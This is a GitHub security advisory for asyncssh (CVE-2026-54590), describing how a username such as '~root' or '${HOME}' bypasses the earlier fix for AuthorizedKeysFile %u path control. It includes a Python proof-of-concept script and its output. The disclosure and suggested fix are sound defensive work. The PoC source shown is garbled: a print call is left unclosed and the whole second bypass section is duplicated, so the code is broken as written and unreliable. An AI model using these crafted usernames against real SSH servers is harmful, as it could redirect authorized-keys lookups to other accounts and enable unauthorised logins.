# [M] asyncssh has an incomplete fix for CVE-2026-45309 — AuthorizedKeysFile %u still escapes the intended directory via a leading ~ (and weakly via ${ENV}) username substitution

## Summary
Severity: Medium
Advisory: GHSA-qr67-gv47-xwwh
CVE: CVE-2026-54590
CWE: CWE-22, CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-08-26
Source: https://github.com/advisories/GHSA-qr67-gv47-xwwh
Type: github-advisory

## Affected
- PyPI: `asyncssh` — affected >=0 <2.23.1

## Details
**Incomplete fix for CVE-2026-45309 (GHSA-g794-3fmp-753h).** The
  2.23.0 guard that sanitises the SSH username before `%u` substitution
  in `AuthorizedKeysFile` blocks `/`, `\` and `..`, but does not block a
  leading `~` (or `${ENV}`), both of which are re-introduced by later
  expansion and reach the file open — defeating the guard.

  **Affected:** asyncssh 2.23.0 and current `develop` (commit `a60f863`,
  HEAD on 2026-05-29).

  ## Summary
  The fix for CVE-2026-45309 added a guard in
  `SSHServerConfig._set_tokens` (`asyncssh/config.py:715-716`) that
  rejects an SSH username containing `/`, `\`, or equal to `..`, before
  it is substituted for the `%u` token in `AuthorizedKeysFile`:

      if self._user == '..' or '/' in self._user or '\\' in self._user:
          raise IllegalUserName('Unsafe username substitution')

  However, the `%u`-substituted value is subsequently passed through
  environment-variable expansion (`_expand_val`, `config.py:145-149` —
  token expansion then env expansion) and, at file-open time, through
  `expanduser()` (`read_authorized_keys` → `read_file` →
  `open(Path(filename).expanduser())`, `auth_keys.py:348` →
  `misc.py:290`). Both re-introduce the path control the guard was meant
  to remove, so a username that contains no `/`/`\` can still cause the
  server to read an authorized-keys file outside the intended per-user
  directory.

  The client-supplied username reaches this path pre-authentication:
  `_process_userauth_request` takes the username from the
  `SSH_MSG_USERAUTH_REQUEST` packet (`connection.py:2516-2519`) and
  `_finish_userauth` calls `reload_config()` (`connection.py:2536`),
  which re-evaluates `AuthorizedKeysFile` with `username=self._username`
  (`connection.py:5906`) before the offered key is validated.

  ## Primary vector — leading `~`
  A username such as `~root` or `~victim` passes the guard (no `/`). For
  a server whose `AuthorizedKeysFile` begins with `%u` — e.g.
  `AuthorizedKeysFile %u/.ssh/authorized_keys` — the expanded value is
  `~victim/.ssh/authorized_keys`, which `expanduser()` resolves to
  `/home/victim/.ssh/authorized_keys` (`~root` → `/root/...`; a bare `~`
  → the server process's home). The username has therefore escaped the
  intended per-user location without using any path separator —
  defeating the purpose of the guard.

  Note: `expanduser()` only expands a leading `~`, so this vector
  requires `%u` to be the first path component of `AuthorizedKeysFile`.
  (The CVE-2026-45309 `authorized_keys/%u` example — `%u` not leading —
  is not reachable this way; that was the `../` form.)

  ## Impact and limitations
  - Demonstrated (verified against source at `a60f863`): the guard is
  bypassable and the authorized-keys lookup is redirected to an
  attacker-named home tree, pre-auth, with a separator-free username.
  - Impact model = identical to CVE-2026-45309: authenticating as the
  redirected username when a readable authorized-keys file containing
  the attacker's key is reachable at the redirected location. The parent
  CVE accepted this exact precondition and was scored `C:N/I:H/A:N`;
  this is scored consistently.
  - Not built: a live multi-account SSH auth harness; the PoC verifies
  the path-redirection mechanism in-process, deterministically. No new
  primitive is claimed beyond the parent CVE's accepted model — only
  that the 2.23.0 fix does not close it for `~`/`${ENV}`.
  - Preconditions (captured by AC:H): `%u` must be the leading path
  component; on Python 3.13, `Path('~nonexistentuser').expanduser()`
  raises `RuntimeError`, so only existing accounts are reachable
  (confirmed: asyncssh 2.23.0, Python 3.13.12).

  ## Secondary vector — `${ENV}` (defense-in-depth only)
  A username like `${HOME}` also passes the guard and is then
  environment-expanded, re-introducing `/`. Weaker and not a practical
  exploit: the attacker can only reference env vars that already exist
  in the server process (a missing variable raises `ConfigParseError`)
  and cannot control their values. Reported as hardening.

  ## Reproduction
  In-process, deterministic, no network. Against a checkout of asyncssh
  2.23.0:

      cd /path/to/asyncssh
      PYTHONPATH=/path/to/asyncssh python3 poc_authkeys_token_bypass.py

  Output (abridged):

      [1] original CVE '../../../../tmp/evil' blocked: True   (fix present)
          literal-slash user '/etc' blocked:           True
      [A] tilde bypass  user '~root':
          guard blocks it? False        (False == bypass)
          expanded config value : ['~root/.ssh/authorized_keys']
          after expanduser()    : /root/.ssh/authorized_keys   <-- read  as authorized_keys
      VERDICT: guard is bypassable via ~ and ${ENV} (incomplete fix CONFIRMED)

  ## Suggested fix
  Tighten `_set_tokens` to also reject usernames that re-introduce path
  control after expansion — reject a leading `~` / `~user` and `$`/`${`
  references in `self._user`. More robustly, validate that the FINAL
  expanded `AuthorizedKeysFile` path remains within the intended base
  directory, and/or suppress `expanduser`/environment expansion on the
  `%u`-derived component specifically.

  ## Disclosure
  Coordinated, ~90-day default. I will not publish details/PoC before a
  fix is released, and am happy to validate the patch. Credit (if given)
  to `cesabici-bit`.

  ## PoC source
  (see code block below)

```python
 #!/usr/bin/env python3
  """
  PoC: incomplete fix for CVE-2026-45309 (AsyncSSH AuthorizedKeysFile %u path
  control). Local-only, in-process, deterministic. No network.

  CVE-2026-45309 (fixed in v2.23.0, commit 2af2382) added a blocklist in
  SSHServerConfig._set_tokens that rejects a client username containing
  '/', '\\', or equal to '..' before it is substituted for the %u token in
  the server's AuthorizedKeysFile directive.

  This PoC shows the blocklist is bypassable: the %u value is afterwards run
  through (1) ${ENV} expansion and (2) ~ expanduser(), both of which
  re-introduce the path control the guard was meant to remove.

  CAVEAT (triage 2026-05-29): the PRIMARY vector is (2) ~ expanduser() — it lets
  a separator-free username (e.g. '~root') escape to another home tree when %u
  is the LEADING path component. Vector (1) ${ENV} is WEAK: a real attacker can
  only REFERENCE env vars that already exist on the server and cannot control
  their VALUES; the ${ASYNCSSH_POC_VAR} demo below sets the var itself purely to
  illustrate the expansion, and does NOT represent attacker capability. Treat (1)
  as defense-in-depth, (2) as the load-bearing finding. See NOTES.md / REPORT.md.

  Run from a checkout of asyncssh (cwd on sys.path), e.g.:
      cd /tmp/targets/asyncssh && python3 <thisfile>
  """

  import os
  import sys
  import tempfile
  from pathlib import Path

  import asyncssh
  from asyncssh.config import SSHServerConfig

  try:
      from asyncssh.misc import IllegalUserName
  except Exception:  # pragma: no cover
      IllegalUserName = asyncssh.IllegalUserName


  def expand_authkeys(user, cfg_text):
      """Load a server config exactly as SSHServerConnection does and return the
      expanded AuthorizedKeysFile value (a list). Raises IllegalUserName if the
      CVE-2026-45309 guard fires."""
      with tempfile.NamedTemporaryFile("w", suffix=".conf", delete=False) as f:
          f.write(cfg_text)
          cfg_path = f.name
      try:
          # mirror connection.py:8897
          #   SSHServerConfig.load(last_config, config, reload, canonical, final,
          #                        accept_addr, accept_port, username,
          #                        client_host, client_addr)
          cfg = SSHServerConfig.load(
              None, cfg_path, True, False, False,
              "127.0.0.1", 22, user, "client.example", "203.0.113.7",
          )
          return cfg.get("AuthorizedKeysFile")
      finally:
          os.unlink(cfg_path)


  def guard_blocks(user, cfg_text):
      """Return True if the CVE-2026-45309 guard rejects this username."""
      try:
          expand_authkeys(user, cfg_text)
          return False
      except IllegalUserName:
          return True


  def main():
      print(f"# asyncssh {asyncssh.__version__}  ({asyncssh.__file__})")
      print(f"# python {sys.version.split()[0]}\n")

      results = []

      # ---- Sanity 0: benign username expands normally -----------------------
      cfg = "AuthorizedKeysFile /etc/ssh/authorized_keys.d/%u"
      val = expand_authkeys("alice", cfg)
      print(f"[0] benign user 'alice':            {val}")
      results.append(("benign expands to per-user path",
                      val == ["/etc/ssh/authorized_keys.d/alice"]))

      # ---- Sanity 1: original CVE-2026-45309 is blocked ---------------------
      blocked = guard_blocks("../../../../tmp/evil", cfg)
      print(f"[1] original CVE '../../../../tmp/evil' blocked: {blocked}")
      results.append(("original CVE traversal is blocked (fix present)", blocked))

      # also: a literal slash is blocked (the guard's whole purpose)
      slash_blocked = guard_blocks("/etc", cfg)
      print(f"    literal-slash user '/etc' blocked: {slash_blocked}")
      results.append(("literal-slash username is blocked", slash_blocked))

      print()

      # ---- BYPASS A: ~ tilde survives the guard, reaches expanduser() -------
      cfg_a = "AuthorizedKeysFile %u/.ssh/authorized_keys"
      blocked_a = guard_blocks("~root", cfg_a)
      val_a = expand_authkeys("~root", cfg_a)
      resolved_a = str(Path(val_a[0]).expanduser())  # what read_file()/open_file() does
      print(f"[A] tilde bypass  user '~root':")
      print(f"    guard blocks it? {blocked_a}   (False == bypass)")
      print(f"    expanded config value : {val_a}")
      print(f"    after expanduser()    : {resolved_a}   <-- read as authorized_keys")
      results.append(("A: ~user NOT blocked by guard", not blocked_a))
      results.append(("A: expanduser() redirects to another home tree",
                      resolved_a.startswith("/root/") or "~" not in resolved_a))

      print()

      # ---- BYPASS B: ${ENV} survives the guard, re-introduces '/' -----------
      # The username contains no '/','\\' and is not '..', so the guard passes.
      # Token expansion makes %u -> '${HOME}', then ENV expansion substitutes a
      # server value that DOES contain '/', defeating the separator filter.
      cfg_b = "AuthorizedKeysFile %u"
      os.environ.setdefault("HOME", "/root")
      blocked_b = guard_blocks("${HOME}", cfg_b)
      val_b = expand_authkeys("${HOME}", cfg_b)
      print(f"[B] env bypass    user '${{HOME}}':")
      print(f"    guard blocks it? {blocked_b}   (False == bypass)")
      print(f"    expanded config value : {val_b} (HOME={os.environ['HOME']})")
      sep_injected = any("/" in p for p in val_b)
      print(f"    contains '/' after guard? {sep_injected}   <-- separator filter bypassed")
      results.append(("B: ${ENV} username NOT blocked by guard", not blocked_b))
      results.append(("B: ${ENV} re-introduces '/' the guard rejected literally",
                      sep_injected))

      # demonstrate arbitrary '/'-containing absolute path via a referenced var
      os.environ["ASYNCSSH_POC_VAR"] = "/tmp/asyncssh_poc/INJECTED/authorized_keys"
      val_b2 = expand_authkeys("${ASYNCSSH_POC_VAR}", cfg_b)
      print(f"    via referenced env var: {val_b2}")
      results.append(("B: env value yields absolute '/'-path post-guard",
                      val_b2 == ["/tmp/asyncssh_poc/INJECTED/authorized_keys"]))

      # ---- verdict ----------------------------------------------------------
      print("\n==== RESULTS ====")
      ok = True
      for name, passed in results:
          print(f"  [{'PASS' if passed else 'FAIL'}] {name}")
          ok = ok and passed
      print("\nVERDICT:",

      print()

      # ---- BYPASS B: ${ENV} survives the guard, re-introduces '/' -----------
      # The username contains no '/','\\' and is not '..', so the guard passes.
      # Token expansion makes %u -> '${HOME}', then ENV expansion substitutes a
      # server value that DOES contain '/', defeating the separator filter.
      cfg_b = "AuthorizedKeysFile %u"
      os.environ.setdefault("HOME", "/root")
      blocked_b = guard_blocks("${HOME}", cfg_b)
      val_b = expand_authkeys("${HOME}", cfg_b)
      print(f"[B] env bypass    user '${{HOME}}':")
      print(f"    guard blocks it? {blocked_b}   (False == bypass)")
      print(f"    expanded config value : {val_b}   (HOME={os.environ['HOME']})")
      sep_injected = any("/" in p for p in val_b)
      print(f"    contains '/' after guard? {sep_injected}   <-- separator filter bypassed")
      results.append(("B: ${ENV} username NOT blocked by guard", not blocked_b))
      results.append(("B: ${ENV} re-introduces '/' the guard rejected literally",
                      sep_injected))

      # demonstrate arbitrary '/'-containing absolute path via a referenced var
      os.environ["ASYNCSSH_POC_VAR"] = "/tmp/asyncssh_poc/INJECTED/authorized_keys"
      val_b2 = expand_authkeys("${ASYNCSSH_POC_VAR}", cfg_b)
      print(f"    via referenced env var: {val_b2}")
      results.append(("B: env value yields absolute '/'-path post-guard",
                      val_b2 == ["/tmp/asyncssh_poc/INJECTED/authorized_keys"]))

      # ---- verdict ----------------------------------------------------------
      print("\n==== RESULTS ====")
      ok = True
      for name, passed in results:
          print(f"  [{'PASS' if passed else 'FAIL'}] {name}")
          ok = ok and passed
      print("\nVERDICT:",
            "guard is bypassable via ~ and ${ENV} (incomplete fix CONFIRMED)"
            if ok else "one or more checks did not hold")
      return 0 if ok else 1


  if __name__ == "__main__":
      sys.exit(main())
```

## References
- https://github.com/ronf/asyncssh/security/advisories/GHSA-qr67-gv47-xwwh
- https://nvd.nist.gov/vuln/detail/CVE-2026-54590
- https://github.com/ronf/asyncssh/commit/3d515ba9ba0cd9990d248bdf62bcf05d51261a88
- https://github.com/ronf/asyncssh
- https://github.com/ronf/asyncssh/releases/tag/v2.23.1
